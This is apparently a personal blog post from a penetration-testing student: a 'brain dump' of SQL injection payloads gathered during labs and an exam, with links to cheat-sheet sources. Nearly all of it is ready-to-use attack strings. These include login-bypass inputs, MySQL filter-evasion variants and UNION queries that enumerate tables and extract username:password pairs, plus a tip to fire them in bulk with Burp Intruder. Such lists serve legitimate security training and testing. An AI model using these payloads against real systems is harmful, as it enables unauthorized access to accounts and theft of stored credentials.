---
layout: post
title:  "SQL Injection"
date:   2018-11-08 10:00:00 +1100
categories: [sql-injection, security]
permalink: /:title:output_ext
comments: true
---

<br>
\-- It's not a guide on SQL Injection but more of a brain dump which I used during the labs and exam.<br>
\-- The easiest way to use it would be put all the strings in a text file and run using Burp Suite's Intruder function(or tab, what ever you call it) to pass the values one by one.

Source: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

Source: https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

```​
' or 1=1#
' or 1=1– –
' or 1=1/* (MySQL < 5.1)
' or 1=1;%00
' or 1=1 union select 1,2 as `
' or#newline
1='1
' or– -newline
1='1
' /*!50000or*/1='1
' /*!or*/1='1
'||1='1
'&&1='1
'='
'-'
' || 1=1 #
' ooor 1=1 #
​admin' or 1=1-- -
​admin' union select 1-- -
​admin' union select 1,2,3,4-- -
​admin' union select 1,@@version,3,4-- -
​thes')order by 3#

​thes' order by 1-- -
Worked till 4, and got a 500 internal server error for 5. This means we have 4 columns to work with.

​thes' union select all 1,database(),3,4-- -
s' union select all null,database(),null,null-- -
​thes' union select all 1,@@version,3,4-- -
thes' union select all 1,user(),3,4-- -
thes' union select all 1,table_name, table_schema from information_schema.columns,4-- -
​thes' union all select 1,2,concat(name, 0x3A , password),4 from users-- -
thes' union select all 1,table_name,3,4 FROM information_schema.tables-- -
thes' union+select+1,(select+group_concat(username,0x3a,password) from sysadmin.users
thes' union select 1,TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables,4-- -
s' UNION SELECT 1,table_name,3,4 FROM information_schema.tables-- -
f' UNION SELECT 1,table_name,column_name,4 FROM information_schema.tables-- -
f' union select 1,table_name,3,4 from information_schema.tables-- -
f' UNION SELECT 1,table_name, column_name FROM information_schema.columns,4-- -
f' UNION SELECT table_schema,table_name FROM information_schema.tables-- -
f' union select null,table_schema from information_schema.tables,null,null-- -
​f' union select 1,table_name,3,4 from information_schema.tables-- -
​d' union select 1,(select group_concat(username,0x3a,password) from sysadmin.users-- -
d' union select 1,username,3,4 from sysadmin.users-- -
​f' union select null,table_name,null,null FROM information_schema.tables-- -
​thes' union select all 1,table_schema from information_schema.tables-- -
this')union+select+all+1,table_name+from+information_schema.tables+where+table_schema='sysadmin'#
this')union+select+all+1,column_name+from+information_schema.columns+where+table_name='users'#
this')+union+select+1,(select+group_concat(username,0x3a,password)+from+sysadmin.users)#
```

**More References:**

​https://xapax.gitbooks.io/security/content/sql-injections.html<br>
https://information.rapid7.com/sql-injection-cheat-sheet-download.html<br>
https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)<br>
http://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/<br>
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet<br>
https://pentestmag.com/how-to-train-your-skills-in-sql-injection/<br>
https://www.sqltutorial.org/sql-list-all-tables/<br>
https://chartio.com/resources/tutorials/sql-server-list-tables-how-to-show-all-tables/
